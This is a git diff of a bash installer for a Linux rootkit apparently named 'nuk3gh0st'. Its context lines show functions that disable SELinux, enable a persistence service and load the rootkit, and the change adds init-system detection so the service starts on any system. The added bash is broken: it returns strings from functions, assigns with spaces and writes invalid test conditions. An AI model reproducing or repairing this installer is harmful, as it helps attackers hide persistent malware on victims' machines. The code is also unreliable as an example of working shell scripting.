@@ -37,7 +37,7 @@ function disable_selinux {
 	echo ""
 }
 
-function enable_startup_service {
+function enable_systemd_service {
 	echo -e "${item} Enabling nuk3gh0st.service"
 	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
 	echo -n -e "${cyan}"
@@ -51,6 +51,33 @@ function enable_startup_service {
 	#service nuk3gh0st start
 	#echo -n -e "${endColor}"
 	#echo ""
+}
+
+function detect_init_system {
+	if [[ `/sbin/init --version` =~ upstart ]]; then 
+		echo -e "${item} Init system is upstart"
+		return "upstart"
+	elif [[ `systemctl` =~ -\.mount ]]; then 
+		echo -e "${item} Init system is systemd"
+		return "systemd"
+	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then 
+		echo -e "${item} Init system is sysv-init"
+		return "sysv-init"
+	else 
+		echo cannot tell; 
+	fi
+}
+
+function enable_startup_service {
+	echo -e "${item} Detecting init system..."
+	init_system = detect_init_system
+	if [ init_system == upstart || init_system == sysv-init ]; then
+		echo "System is Upstart/init"
+	elif [ init_system == systemd ]; then
+		echo "System is SYSTEMD"
+	else
+		echo cannot tell;
+	fi
 }
 
 function load_rootkit {
